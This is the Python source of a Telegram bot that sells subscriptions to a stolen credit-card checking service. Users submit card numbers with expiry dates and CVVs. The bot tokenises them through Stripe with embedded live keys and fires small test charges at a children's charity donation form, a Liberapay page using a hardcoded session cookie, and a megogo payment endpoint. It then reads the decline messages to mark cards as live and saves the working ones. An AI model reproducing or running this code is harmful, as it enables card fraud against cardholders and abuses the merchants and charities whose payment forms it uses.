# -*- coding: utf-8 -*-

import aiogram, re, traceback, random, json, datetime, aiohttp
from aiogram import Bot, Dispatcher, executor, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.types import CallbackQuery
from pyqiwip2p import QiwiP2P
# Local imports
from configuration import config
from filters import IsPrivate
from keyboard import menu, admin
from data.csdb import *
from states.main_states import *


bot = Bot(token=config.token, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot, storage=MemoryStorage())


@dp.message_handler(IsPrivate(), commands=['start'], state="*")
async def start_command(message: types.Message, state: FSMContext):
	await state.finish()
	user = await get_user(message.from_user.id)
	if user is None:
		await register_user(message.from_user.id, message.from_user.username, datetime.datetime.today().strftime('%d/%m/%Y %H:%M:%S'))
	else:
		await message.answer("<b>Привет! Чтобы начать работу жми на кнопки снизу.</b>", reply_markup = await menu.main_menu(message.from_user.id))


@dp.callback_query_handler(text="back", state="*")
async def return_all(call: CallbackQuery, state: FSMContext):
	await state.finish()
	await bot.delete_message(call.message.chat.id, call.message.message_id)
	await bot.send_message(call.message.chat.id, "<b>Привет! Чтобы начать работу жми на кнопки снизу.</b>", reply_markup = await menu.main_menu(call.from_user.id))


@dp.callback_query_handler(text="profile", state="*")
async def profile(call: CallbackQuery, state: FSMContext):
	await state.finish()
	await bot.delete_message(call.message.chat.id, call.message.message_id)
	profile = await get_user(call.from_user.id)
	await bot.send_message(call.message.chat.id, f"😏 <b>Профиль {call.from_user.mention}:</b>\n\n<b>═════════════ஜ▲ஜ═════════════\n🆔:</b> <code>{profile[0]}</code>\n💎 <b>Подписка до:</b> <i>{profile[3]}</i>\n📅 <b>Дата регистрации:</b> <i>{profile[4]}</i>\n<b>═════════════ஜ▲ஜ═════════════</b>\n\n<b><i>Спасибо за то, что выбрали нас!</i></b>", reply_markup = await menu.profile())


@dp.callback_query_handler(text="help", state="*")
async def help(call: CallbackQuery, state: FSMContext):
	await state.finish()
	await bot.delete_message(call.message.chat.id, call.message.message_id)
	await bot.send_message(call.from_user.id, "<b>Как пользоваться ботом?</b>\n\n<i>Для начала работы, Вам необходимо нажать соответствующую кнопку в меню. Далее Вам нужно ввести данные карты и ждать завершения проверки.\nВ данный момент доступен один сервис со списанием в размере 1 рубля.</i>\n\n<b>По вопросам работы бота:</b>\n<i>@Tesla_TC\n@StayInMind</i>", reply_markup = await menu.main_menu(call.from_user.id))


@dp.callback_query_handler(text="subscribe", state="*")
async def subscribe(call: CallbackQuery, state: FSMContext):
	await state.finish()
	await bot.delete_message(call.message.chat.id, call.message.message_id)
	await bot.send_message(call.from_user.id, "<b>Выберите план:</b>", reply_markup = await menu.plan_menu())


@dp.callback_query_handler(text_startswith="buy_sub", state="*")
async def process_buying(call: CallbackQuery, state: FSMContext):
	await state.finish()
	await bot.delete_message(call.message.chat.id, call.message.message_id)
	if call.data == "buy_sub one_day":
		await bot.send_message(call.from_user.id, "<b>К оплате:</b> <code>666</code> <b>руб.</b>\n\n<b>Выберите способ покупки:</b>", reply_markup = await menu.payment_methods("one_day"))
	elif call.data == "buy_sub three_days":
		await bot.send_message(call.from_user.id, "<b>К оплате:</b> <code>1666</code> <b>руб.</b>\n\n<b>Выберите способ покупки:</b>", reply_markup = await menu.payment_methods("three_days"))
	elif call.data == "buy_sub seven_days":
		await bot.send_message(call.from_user.id, "<b>К оплате:</b> <code>3333</code> <b>руб.</b>\n\n<b>Выберите способ покупки:</b>", reply_markup = await menu.payment_methods("seven_days"))

	#status = await buy_sub(call.from_user.id, 1, 250)


@dp.callback_query_handler(text_startswith="qiwi", state="*")
async def payment_qiwi(call: CallbackQuery, state: FSMContext):
	await state.finish()
	await bot.delete_message(call.message.chat.id, call.message.message_id)
	summa = 0
	if call.data == "qiwi one_day":
		summa = 666
	elif call.data == "qiwi three_days":
		summa = 1666
	elif call.data == "qiwi seven_days":
		summa = 3333
	try:
		chat_id = call.message.chat.id
		code = random.randint(1000000000, 9999999999)
		qiwi = QiwiP2P(config.private_key)
		bill = qiwi.bill(bill_id=code, amount=summa, comment=code)
		send_requests = bill.pay_url
		await bot.send_message(chat_id, f"<b>💸 Пополнение</b> <code>#{code}</code>\n\n<b>💵 Сумма пополнения:</b> <code>{summa}</code> <b>RUB</b>\n\n❗ У вас имеется 30 минут на оплату счета.\n🔄 После оплаты, нажмите на <code>Проверить оплату</code>", reply_markup = await menu.payment_keyboard(send_requests, code, summa))
	except:
		print(traceback.format_exc())


@dp.callback_query_handler(text_startswith="check_qiwi", state="*")
async def check_funds(call: CallbackQuery, state: FSMContext):

	await state.finish()

	chat_id = call.message.chat.id

	data_text = call.data.replace("check_qiwi ", "")
	data = data_text.split()


	plan = 0

	if data[1] == 666:
		plan = 1
	elif data[1] == 1666:
		plan = 3
	elif data[1] == 3333:
		plan = 7

	qiwi = QiwiP2P(config.private_key)
	pay_comment = qiwi.check(bill_id=data[0]).comment  # Получение комментария платежа
	pay_status = qiwi.check(bill_id=data[0]).status  # Получение статуса платежа
	pay_amount = float(qiwi.check(bill_id=data[0]).amount)  # Получение суммы платежа в рублях
	pay_amount = int(pay_amount)

	if pay_status == "PAID":
		if pay_amount >= data[1]:
			status = await buy_sub(call.from_user.id, plan)
			if status == "Success":
				await bot.send_message(call.from_user.id, f"<b>Вы успешно приобрели подписку. Дней осталось:</b> <code>{plan}</code>", reply_markup = await menu.main_menu(call.from_user.id))
				await update_profit(pay_amount)
				admins = await get_admins()
				for admin in admins:
					await bot.send_message(admin[0], f"<b>💰 Пользователь</b> "
						f"({call.from_user.mention}|<a href='tg://user?id={chat_id}'>{call.from_user.first_name}</a>"
						f"|<code>{chat_id}</code>) "
						f"<b>купил подписку за</b> <code>{pay_amount} руб</code> 🥝\n")

	elif pay_status == "EXPIRED":
		await bot.edit_message_text("<b>❌ Время оплаты вышло. Платёж был удалён.</b>",
                                    call.message.chat.id,
                                    call.message.message_id,
                                    reply_markup=await menu.main_menu(call.from_user.id))
    
	elif pay_status == "WAITING":
		await bot.answer_callback_query(call.id, "❗ Оплата не была произведена.", True)
        
	elif pay_status == "REJECTED":
		await bot.edit_message_text("<b>❌ Счёт был отклонён.</b>",
                                    call.message.chat.id,
                                    call.message.message_id,
                                    reply_markup=await menu.main_menu(call.from_user.id))

	else:
		await bot.answer_callback_query(call.id, "❗ Оплата была произведена не в рублях.", True)

'''
async def payment_btc(call, plan):
	pass
'''
@dp.message_handler(text="/testupdate")
async def testupdate(message: types.Message):
	await update_profit(1)


@dp.callback_query_handler(text="checker", state="*")
async def check_cards(call: CallbackQuery, state: FSMContext):
	await state.finish()
	await bot.delete_message(call.message.chat.id, call.message.message_id)
	profile = await get_user(call.from_user.id)
	try:
		until = datetime.datetime.strptime(profile[3], "%d/%m/%Y %H:%M:%S")
	except:
		until = "Неактивна"
	if until == "Неактивна":
		await bot.send_message(call.message.chat.id, "<b>У Вас отсутствует подписка. Её можно купить, нажав кнопку ниже ⬇️</b>", reply_markup = await menu.subscribe())
	elif profile[2] != "Неактивна" and datetime.datetime.now() < until:
		await bot.send_message(call.message.chat.id, "<b>Выберите действие:</b>", reply_markup = await menu.check_menu())
	else:
		if profile[2] != "Нет" and profile[3] != "Неактивна":
			await del_sub(call.from_user.id)
			await bot.send_message(call.message.chat.id, "<b>Ваша подписка закончилась.</b>", reply_markup = await menu.subscribe())
		else:
			await bot.send_message(call.message.chat.id, "<b>У Вас отсутствует подписка. Её можно купить, нажав кнопку ниже ⬇️</b>", reply_markup = await menu.subscribe())


@dp.callback_query_handler(text="charge_five_dol", state="*")
async def charge_five_dollars(call: CallbackQuery, state: FSMContext):
	await state.finish()
	await bot.delete_message(call.message.chat.id, call.message.message_id)
	await bot.send_message(call.message.chat.id, "<b>Введите данные карты в формате:</b>\n<i>[Номер карты]|[Месяц]|[Год]|[CVV]</i>\n<b>Пример:</b>\n<i>4890494678599200|12|24|711</i>", reply_markup = await menu.return_all())
	await CardEnterDollar.card.set()


@dp.callback_query_handler(text="charge_one_rub", state="*")
async def charge_one_rub(call: CallbackQuery, state: FSMContext):
	await state.finish()
	await bot.delete_message(call.message.chat.id, call.message.message_id)
	await bot.send_message(call.message.chat.id, "<b>Введите данные карты в формате:</b>\n<i>[Номер карты]|[Месяц]|[Год]|[CVV]</i>\n<b>Пример:</b>\n<i>4890494678599200|12|24|711</i>", reply_markup = await menu.return_all())
	await CardEnterRub.card.set()


@dp.callback_query_handler(text="auth_check", state="*")
async def authorization_check(call: CallbackQuery, state: FSMContext):
	await state.finish()
	await bot.send_message(call.message.chat.id, "<b>Временно недоступно :'(</b>")


@dp.message_handler(IsPrivate(), state=CardEnterDollar.card)
async def accept_card_dol(message: types.Message, state: FSMContext):
	await message.answer("<b>❇️ Карты приняты. Проверка может занять несколько минут (в зависимости от кол-ва карт).</b>")

	msg = message.text
	formatted = msg.replace("|", " ")
	cards = formatted.split()

	x = 0

	new_cards = []
	res_cards = []

	for card in cards:
		if x == 0:
			new_cards.append(card)
		elif x == 1:
			new_cards.append(card)
		elif x == 2:
			new_cards.append(card)
		elif x == 3:
			new_cards.append(card)
			res_cards.append("|".join(new_cards))
			new_cards.clear()
			x = -1
		x += 1

	full_res = []

	for card in res_cards:
		replaced = card.replace("|", " ")
		formatted = replaced.split()
		card_number = formatted[0]
		card_month = formatted[1]
		card_year = formatted[2]
		card_cvv = formatted[3]

		headers = {
			"origin": "https://js.stripe.com",
			"referer": "https://js.stripe.com/",
			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
		}	

		data = {
			"card[number]": card_number,
			"card[cvc]": card_cvv,
			"card[exp_month]": card_month,
			"card[exp_year]": card_year,
			"guid": "96fc31c3-a1ad-4b4b-a166-2e250f8ceca691310e",
			"muid": "494c63ef-64cb-48ba-b184-0babfb067f845f9d2e",
			"sid": "a2406096-177c-419e-a6fa-992d4b63ee916fffcb",
			"payment_user_agent": "stripe.js/673cc8e85; stripe-js-v3/673cc8e85",
			"time_on_page": "46330",
			"key": "pk_live_0lD9jdSDA9Ra5obkrJzQanyb",
			"pasted_fields": "number",
		}


		async with aiohttp.ClientSession() as session:
			async with session.post(url="https://api.stripe.com/v1/tokens", data=data, headers=headers) as get_token:
				response = await get_token.json()
		
				try:
					token = response["id"]
				except Exception as e:
					full_res.append(f"<b>⋙══════ஜ▲ஜ══════⋘</b>\n💳 <code>{card}</code>\n<b>➤ Status:</b> ❌ Некорректный номер карты\n<b>➤ Response:</b> ❌ Incorrect card number\n<b>➤ Gateway:</b> <b>Tesla Charge 5$</b>\n")
					continue

		headers2 = {
			"origin": "https://nohungrychildren.org",
			"referer": "https://nohungrychildren.org/one-dollar-feeds-one-child-for-one-week/",
			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
		}

		data2 = {
			"firstName": "Harry",
			"email": "oqkqk@gmail.com",
			"stripeToken": token,
			"planType": "2",
			"itemPrice": "5.00",
			"schoolId": "0",
			"campId": "0",
			"initiative": "Generic",
			"processing": "0.00",
		}
		
		async with aiohttp.ClientSession() as session:
			async with session.post(url="https://nohungrychildren.org/addcustomer.php", data=data2, headers=headers2) as check:

				if "Donation Failed:Invalid account." in await check.text():
					result = "<b>❌ Invalid Account.</b>"
					status = "<b>❌ Мертва.</b>"
				elif await check.text() == 'Donation Failed:Your card was declined.<br><div class="join btn">Try Again</div>' or await check.text() == "Donation Failed:Your card was declined.":
					result = "<b>❌ Card was declined.</b>"
					status = "<b>❌ Мертва.</b>"
				elif await check.text() == "Donation Failed:Your card number is incorrect." or await check.text() == 'Donation Failed:Your card number is incorrect.<br><div class="join btn">Try Again</div>':
					result = "<b>❌ Card number is incorrect.</b>"
					status = "<b>❌ Некорректная карта.</b>"
				elif await check.text() == "Donation Failed:Your card has insufficient funds." or await check.text() == 'Donation Failed:Your card has insufficient funds.<br><div class="join btn">Try Again</div>':
					result = "<b>❌ Card has insufficient funds.</b>"
					status = "<b>❌ Недостаточно средств | 5$</b>"
				elif await check.text() == "Donation Failed:Your card has expired." or await check.text() == 'Donation Failed:Your card has expired.<br><div class="join btn">Try Again</div>':
					result = "<b>❌ Card has expired.</b>"
					status = "<b>❌ Карта истекла.</b>"
				elif await check.text() == "Donation Failed:Your card was declined. This transaction requires authentication." or await check.text() == 'Donation Failed:Your card was declined. This transaction requires authentication.<br><div class="join btn">Try Again</div>':
					result = "<b>❌ Transaction requires authentication.</b>"
					status = "<b>❌ Карта отклонена. Необходима аутентификация.</b>"		
				elif await check.text() == "Donation Failed:Your card does not support this type of purchase." or await check.text() == 'Donation Failed:Your card does not support this type of purchase.<br><div class="join btn">Try Again</div>':
					result = "<b>❌ Card doesn`t support this type of purchase.</b>"
					status = "<b>❌ Карта не поддерживает данный тип покупки.</b>"	
				elif await check.text() == "success":	
					result = "Success"
					status = "<b>✅ Прошла | 5$</b>"
					await add_card(card, "5$")
				else:
					print(await check.text())
					result = await check.text()
					status = "<b>❌ Отклонено.</b>"	
					


				full_res.append(f"<b>⋙══════ஜ▲ஜ══════⋘</b>\n💳 <code>{card}</code>\n<b>➤ Status:</b> {status}\n<b>➤ Response:</b> {result}\n<b>➤ Gateway:</b> <b>Tesla Charge 5$</b>\n")

	result = " ".join(full_res)
	await message.answer(f"<b>🪄 TESLA CHARGE 5$</b>\n\n{result}<b>⋙══════ஜ▲ஜ══════⋘</b>\n\n<b>👁| Checked by</b> <i>{message.from_user.mention}</i>\n<b>🥷🏻| Checker:</b> <i>@TeslaCheckerRobot</i>")
	await message.answer(f"<b>🤔 Что будем делать дальше?</b>", reply_markup = await menu.main_menu(message.from_user.id))
	await state.finish()


@dp.message_handler(IsPrivate(), state=CardEnterRub.card)
async def accept_card_rub(message: types.Message, state: FSMContext):
	await message.answer("<b>❇️ Карты приняты. Проверка может занять несколько минут (в зависимости от кол-ва карт).</b>")
	msg = message.text
	formatted = msg.replace("|", " ")
	cards = formatted.split()

	x = 0

	new_cards = []
	res_cards = []

	for card in cards:
		if x == 0:
			new_cards.append(card)
		elif x == 1:
			new_cards.append(card)
		elif x == 2:
			new_cards.append(card)
		elif x == 3:
			new_cards.append(card)
			res_cards.append("|".join(new_cards))
			new_cards.clear()
			x = -1
		x += 1

	full_res = []

	for card in res_cards:
		replaced = card.replace("|", " ")
		formatted = replaced.split()
		card_number = formatted[0]
		card_month = formatted[1]
		card_year = formatted[2]
		card_cvv = formatted[3]

		headers = {
			"accept": "application/json, text/javascript, */*; q=0.01",
			"origin": "https://cards.megogo.net",
			"referer": "https://cards.megogo.net/s/iframe/site2?version=payment_v3",
			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
		}	

		data = {
			"card.number": card_number,
			"card.month": card_month,
			"card.year": card_year,
			"card.cvv": card_cvv,
			"csrf_token": "d6574c62ac6f402bbaa0d1c87d83dd8fc400a0ce-1635494592892-d6ed767c88cc46af98e4e032",
			"card.cardholder": "MEGOGO",
			"card.savecard": "False",
		}


		async with aiohttp.ClientSession() as session:
			async with session.post(url="https://cards.megogo.net/payment/pay", data=data, headers=headers) as resp:
				check = await resp.json()
				verdikt = check["message"]
		
				if "Your payment was declined." in verdikt:
					result = "<b>❌ DEAD | FAILED 1₽</b>"
					status = "<b>Your payment was declined.</b>"
				else:
					result = "<b>✅ ALIVE | CHARGE 1₽</b>"
					status = f"<b>{verdikt}</b>"
					await add_card(card, "1₽")


				full_res.append(f"<b>⋙══════ஜ▲ஜ══════⋘</b>\n💳 <code>{card}</code>\n<b>➤ Status:</b> {status}\n<b>➤ Response:</b> {result}\n<b>➤ Gateway:</b> <b>Tesla Charge 1₽</b>\n")

	result = " ".join(full_res)
	await message.answer(f"<b>🪄 TESLA CHARGE 1₽</b>\n\n{result}<b>⋙══════ஜ▲ஜ══════⋘</b>\n\n<b>👁| Checked by</b> <i>{message.from_user.mention}</i>\n<b>🥷🏻| Checker:</b> <i>@TeslaCheckerRobot</i>")
	await message.answer(f"<b>🤔 Что будем делать дальше?</b>", reply_markup = await menu.main_menu(message.from_user.id))
	await state.finish()


# -------------------- GROUP COMMANDS PART -------------------- #

async def accept_card_dol_gr(message):
	await message.answer("<b>❇️ Карты приняты. Проверка может занять несколько минут (в зависимости от кол-ва карт).</b>")

	msg = message.text.replace("/stripe ", "")

	formatted = msg.replace("|", " ")
	card = formatted.split()
	if len(card) > 4:
		await message.answer("<b>Больше одной карты нельзя!</b>")
		return
	
	card_number = card[0]
	card_month = card[1]
	card_year = card[2]
	card_cvv = card[3]

	full_res = []

	headers = {
		"origin": "https://js.stripe.com",
		"referer": "https://js.stripe.com/",
		"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
	}	

	data = {
		"type": "card",
		"billing_details[name]": "Van Darkholme",
		"card[number]": card_number,
		"card[cvc]": card_cvv,
		"card[exp_month]": card_month,
		"card[exp_year]": card_year,
		"guid": "NA",
		"muid": "b96c3835-78d5-4a33-a371-af004fe59fc6fa84a4",
		"sid": "f9bf980d-eaea-456a-ad78-1c1f607106744782a6",
		"pasted_fields": "number",
		"payment_user_agent": "stripe.js/673cc8e85; stripe-js-v3/673cc8e85",
		"time_on_page": "46330",
		"key": "pk_live_pLTYwRrns5uq7ARj668wjrWu",
	}


	async with aiohttp.ClientSession() as session:
		async with session.post(url="https://api.stripe.com/v1/payment_methods", data=data, headers=headers) as get_token:
			response = await get_token.json()
			try:
				token = response["id"]
			except Exception as e:
				card2 = "|".join(card)
				full_res.append(f"<b>⋙══════ஜ▲ஜ══════⋘</b>\n💳 <code>{card2}</code>\n<b>➤ Status:</b> ❌ Некорректный номер карты\n<b>➤ Response:</b> ❌ Incorrect card number\n<b>➤ Gateway:</b> <b>Tesla Charge 5$</b>\n")
				result = " ".join(full_res)
				await message.answer(f"<b>🪄 TESLA CHARGE 5$</b>\n\n{result}<b>⋙══════ஜ▲ஜ══════⋘</b>\n\n<b>👁| Checked by</b> <i>{message.from_user.mention}</i>\n<b>🥷🏻| Checker:</b> <i>@TeslaCheckerRobot</i>")
				return


		headers2 = {
			"cookie": "csrf_token=xQhNRNAMYBK4GtLNBBnVD1wJ8s5yAKUF; session=1773597:2:n1ARgkXcuixxQMal1iqW6UMzEgEvGD9M.pw; __stripe_mid=b96c3835-78d5-4a33-a371-af004fe59fc6fa84a4; __stripe_sid=f9bf980d-eaea-456a-ad78-1c1f607106744782a6",
			"origin": "https://en.liberapay.com",
			"referer": "https://en.liberapay.com/dssadsad/giving/pay/stripe/?beneficiary=17724&method=card",
			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
		}

		data2 = {
			"csrf_token": "xQhNRNAMYBK4GtLNBBnVD1wJ8s5yAKUF",
			"currency": "USD",
			"tips": "112793",
			"amount": "custom",
			"amount_custom": "5",
			"owner.name": "Van Darkholme",
			"stripe_pm_id": token
		}
		
	async with aiohttp.ClientSession() as session:
		async with session.post(url="https://en.liberapay.com/dssadsad/giving/pay/stripe/?beneficiary=17724&method=card", data=data2, headers=headers2) as check:
			if "&#34;The payment processor Stripe returned an error: “Your card&#39;s security code is incorrect." in await check.text():
				result = "<b>❌ Card security code is incorrect.</b>"
				status = "<b>❌ Мертва</b>"
			else:
				print(await check.text(), check.status)
				result = "<b>Да</b>"
				status = "<b>❌ Отклонено.</b>"	
			card2 = "|".join(card)
			full_res.append(f"<b>⋙══════ஜ▲ஜ══════⋘</b>\n💳 <code>{card2}</code>\n<b>➤ Status:</b> {status}\n<b>➤ Response:</b> {result}\n<b>➤ Gateway:</b> <b>Tesla Charge 5$</b>\n")

	result = " ".join(full_res)
	await message.answer(f"<b>🪄 TESLA CHARGE 5$</b>\n\n{result}<b>⋙══════ஜ▲ஜ══════⋘</b>\n\n<b>👁| Checked by</b> <i>{message.from_user.mention}</i>\n<b>🥷🏻| Checker:</b> <i>@TeslaCheckerRobot</i>")


@dp.message_handler(chat_type=[types.ChatType.GROUP, types.ChatType.SUPERGROUP], commands=['stripe'])
async def stripe_command(message: types.Message):
	msg = message.text
	profile = await get_user(message.from_user.id)
	if profile[5] != "Нет":
		until = datetime.datetime.strptime(profile[5], "%d/%m/%Y %H:%M:%S")
		if datetime.datetime.now() > until:
			await accept_card_dol_gr(message)
			await add_cooldown_check(message.from_user.id)
		else:
			await message.answer(f"<b>Подождите до {until}, прежде чем проверять следующую карту.")
	else:
		await accept_card_dol_gr(message)
		await add_cooldown_check(message.from_user.id)

# -------------------- ADMIN PANEL PART -------------------- #

@dp.callback_query_handler(text="panel", state="*")
async def admin_panel(call: CallbackQuery, state: FSMContext):
	await state.finish()
	await bot.delete_message(call.message.chat.id, call.message.message_id)
	await bot.send_message(call.message.chat.id, "<b>👋🏻 Добро пожаловать!</b>", reply_markup = await admin.admin_menu())


@dp.callback_query_handler(text="back_admin", state="*")
async def admin_back(call: CallbackQuery, state: FSMContext):
	await state.finish()
	await bot.delete_message(call.message.chat.id, call.message.message_id)
	await bot.send_message(call.message.chat.id, "<b>👋🏻 Добро пожаловать!</b>", reply_markup = await admin.admin_menu())


@dp.callback_query_handler(text="give_sub", state="*")
async def give_subscribe(call: CallbackQuery, state: FSMContext):
	await state.finish()
	await bot.delete_message(call.message.chat.id, call.message.message_id)
	await AdminGvSub.user_data.set()
	await bot.send_message(call.message.chat.id, "<b>Введите ID пользователя и период подписки в формате:</b>\n<i>[user_id] [период]</i>\n<b>Пример:</b>\n<i>911776214 7</i>", reply_markup = await admin.return_menu())


@dp.message_handler(IsPrivate(), state=AdminGvSub.user_data)
async def accept_user_data_gv_sub(message: types.Message, state: FSMContext):
	data = message.text.split()
	status = await buy_sub(data[0], data[1])
	if status == "Success":
		profile = await get_user(data[0])
		await message.answer(f"<b>Вы успешно выдали подписку пользователю {profile[1]}</b>", reply_markup = await admin.admin_menu())
		await bot.send_message(profile[0], f"<b>Вам выдали подписку. Дней осталось:</b> <code>{data[1]}</code>")
	elif status == "Error":
		await message.answer("<b>Произошла ошибка.</b>")
	await state.finish()


@dp.callback_query_handler(text="take_sub", state="*")
async def take_subscribe(call: CallbackQuery, state: FSMContext):
	await state.finish()
	await bot.delete_message(call.message.chat.id, call.message.message_id)
	await AdminTkSub.user_data.set()
	await bot.send_message(call.message.chat.id, "<b>Введите ID или Username пользовател в формате:</b>\n<i>[user_id]</i>\n<b>Пример:</b>\n <i>911776214</i>", reply_markup = await admin.return_menu())


@dp.message_handler(IsPrivate(), state=AdminTkSub.user_data)
async def accept_user_data_tk_sub(message: types.Message, state: FSMContext):
	data = message.text.split()
	status = await del_sub(data[0])
	if status == "Success":
		profile = await get_user(data[0])
		await message.answer(f"<b>Вы успешно забрали подписку пользователя {profile[1]}</b>", reply_markup = await admin.admin_menu())
		await bot.send_message(profile[0], f"<b>У Вас забрали подписку.</b>")
	else:
		await message.answer()
	await state.finish()


@dp.callback_query_handler(text="give_adm", state="*")
async def give_admin(call: CallbackQuery, state: FSMContext):
	await state.finish()
	await bot.delete_message(call.message.chat.id, call.message.message_id)
	await MakeAdmin.user_data.set()
	await bot.send_message(call.message.chat.id, "<b>Введите ID пользователя для выдачи админки:</b>", reply_markup = await admin.return_menu())


@dp.message_handler(IsPrivate(), state=MakeAdmin.user_data)
async def accept_user_data_gv_adm(message: types.Message, state: FSMContext):
	await add_admin(message.text)
	profile = await get_user(message.text)
	await message.answer(f"<b>Админка выдана пользователю {profile[1]}</b>", reply_markup = await admin.admin_menu())
	await state.finish()


@dp.callback_query_handler(text="take_adm", state="*")
async def kill_admin(call: CallbackQuery, state: FSMContext):
	await state.finish()
	await bot.delete_message(call.message.chat.id, call.message.message_id)
	await KillAdmin.user_data.set()
	await bot.send_message(call.message.chat.id, "<b>Введите ID пользователя для того, чтобы забрать админку:</b>", reply_markup = await admin.return_menu())


@dp.message_handler(IsPrivate(), state=KillAdmin.user_data)
async def accept_user_data_tk_adm(message: types.Message, state: FSMContext):
	await del_admin(message.text)
	profile = await get_user(message.text)
	await message.answer(f"<b>Админка забрана у пользователя {profile[1]}</b>", reply_markup = await admin.admin_menu())
	await state.finish()


@dp.callback_query_handler(text="stats", state="*")
async def bot_info(call: CallbackQuery, state: FSMContext):
	await state.finish()
	profit = await select_profit()
	users = await get_all_users()
	cards = await get_count_cards()
	await bot.send_message(call.message.chat.id, f"📈 <b>Статистика бота:</b>\n\n<b>Куплено подписок на сумму:</b> <code>{profit[0]}</code>\n<b>Всего пользователей:</b> <code>{len(users)}</code>\n<b>Карт прочекано:</b> <code>{len(cards)}</code>")


@dp.callback_query_handler(text="mass_send", state="*")
async def mass_send(call: CallbackQuery, state: FSMContext):
	await state.finish()
	await bot.delete_message(call.message.chat.id, call.message.message_id)
	await SendText.text.set()
	await bot.send_message(call.message.chat.id, "<b>Введите текст рассылки:</b>", reply_markup = await admin.return_menu())


@dp.message_handler(IsPrivate(), state=SendText.text)
async def accept_text(message: types.Message, state: FSMContext):
	users = await get_all_users()
	count = 0
	count_no = 0
	for user in users:
		try:
			await bot.send_message(user[0], message.text)
			count += 1
		except:
			count_no += 1
	await message.answer(f"<b>Рассылка закончена.\nДошло:</b> <code>{count}</code>\n<b>Не получили:</b> <code>{count_no}</code>", reply_markup = await admin.admin_menu())
	await state.finish()


@dp.callback_query_handler(text="get_bd", state="*")
async def backup(call: CallbackQuery, state: FSMContext):
	await state.finish()
	admins = await get_admins()
	for admin in admins:
		with open("data/database_file/checkerBD.sqlite", "rb") as doc:
			await bot.send_document(admin[0],
									doc,
									caption=f"<b>♻️ Бэкап бд:</b>\n🕜 <code>{datetime.datetime.today().replace(microsecond=0)}</code>")


async def on_startup(dp):
	await create_tables()
	await start_profit()


if __name__ == "__main__":
	executor.start_polling(dp, on_startup=on_startup)